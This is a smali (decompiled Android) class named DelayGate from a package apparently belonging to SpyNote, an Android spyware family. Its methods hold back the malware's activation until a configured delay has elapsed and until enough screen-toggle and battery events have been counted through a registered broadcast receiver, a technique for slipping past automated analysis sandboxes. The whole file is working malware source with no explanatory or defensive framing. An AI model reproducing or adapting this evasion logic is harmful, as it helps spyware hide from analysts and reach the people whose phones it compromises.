.class public Lorg/spynote/DelayGate;
.super Ljava/lang/Object;
.source "DelayGate.java"


.method public static canActivate(Landroid/content/Context;)Z
    .locals 8

    const/4 v0, 0x1
    if-nez p0, :cond_0
    return v0

    :cond_0
    :try_start_0
    invoke-static {}, Lorg/spynote/ProtectionConfig;->getConfig()Ljava/lang/String;
    move-result-object v1
    invoke-virtual {v1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
    move-result-object v1

    const-string v2, "delayenabled=true"
    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :cond_1
    return v0

    :cond_1
    const-string v2, "spynote_delay_v1"
    const/4 v3, 0x0
    invoke-virtual {p0, v2, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
    move-result-object v2

    const-string v4, "install_ts"
    const-wide/16 v5, 0x0
    invoke-interface {v2, v4, v5, v6}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J
    move-result-wide v4

    cmp-long v6, v4, v5
    if-nez v6, :cond_2
    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;
    move-result-object v4
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
    move-result-wide v5
    const-string v7, "install_ts"
    invoke-interface {v4, v7, v5, v6}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;
    move-result-object v4
    invoke-interface {v4}, Landroid/content/SharedPreferences$Editor;->apply()V
    const/4 v0, 0x0
    return v0

    :cond_2
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
    move-result-wide v5
    sub-long/2addr v5, v4
    const-string v4, "delayminutes="
    invoke-static {v1, v4}, Lorg/spynote/DelayGate;->extractInt(Ljava/lang/String;Ljava/lang/String;)I
    move-result v4
    if-gtz v4, :cond_3
    const/4 v4, 0x5

    :cond_3
    int-to-long v6, v4
    const-wide/32 v4, 0xea60
    mul-long/2addr v6, v4
    cmp-long v4, v5, v6
    if-gez v4, :cond_4
    const/4 v0, 0x0
    return v0

    :cond_4
    const-string v4, "screentoggles="
    invoke-static {v1, v4}, Lorg/spynote/DelayGate;->extractInt(Ljava/lang/String;Ljava/lang/String;)I
    move-result v4
    const-string v5, "screen_count"
    invoke-interface {v2, v5, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I
    move-result v5
    if-ge v5, v4, :cond_5
    const/4 v0, 0x0
    return v0

    :cond_5
    const-string v4, "batteryevents="
    invoke-static {v1, v4}, Lorg/spynote/DelayGate;->extractInt(Ljava/lang/String;Ljava/lang/String;)I
    move-result v4
    const-string v5, "battery_count"
    invoke-interface {v2, v5, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I
    move-result v2
    if-ge v2, v4, :cond_6
    const/4 v0, 0x0
    return v0

    :cond_6
    return v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return v0
.end method


.method public static registerEvents(Landroid/content/Context;)V
    .locals 3
    if-nez p0, :cond_0
    return-void
    :cond_0
    :try_start_0
    new-instance v0, Lorg/spynote/DelayEventsReceiver;
    invoke-direct {v0}, Lorg/spynote/DelayEventsReceiver;-><init>()V
    new-instance v1, Landroid/content/IntentFilter;
    invoke-direct {v1}, Landroid/content/IntentFilter;-><init>()V
    const-string v2, "android.intent.action.SCREEN_ON"
    invoke-virtual {v1, v2}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V
    const-string v2, "android.intent.action.SCREEN_OFF"
    invoke-virtual {v1, v2}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V
    const-string v2, "android.intent.action.BATTERY_CHANGED"
    invoke-virtual {v1, v2}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V
    invoke-virtual {p0, v0, v1}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    :catch_0
    return-void
.end method


.method private static extractInt(Ljava/lang/String;Ljava/lang/String;)I
    .locals 4
    :try_start_0
    invoke-virtual {p0, p1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I
    move-result v0
    const/4 v1, -0x1
    if-ne v0, v1, :cond_0
    const/4 v0, 0x0
    return v0
    :cond_0
    invoke-virtual {p1}, Ljava/lang/String;->length()I
    move-result v1
    add-int/2addr v0, v1
    invoke-virtual {p0, v0}, Ljava/lang/String;->substring(I)Ljava/lang/String;
    move-result-object v0
    const/16 v1, 0xa
    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(I)I
    move-result v1
    if-lez v1, :cond_1
    const/4 v2, 0x0
    invoke-virtual {v0, v2, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;
    move-result-object v0
    :cond_1
    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
    move-result v0
    return v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    :catch_0
    const/4 v0, 0x0
    return v0
.end method
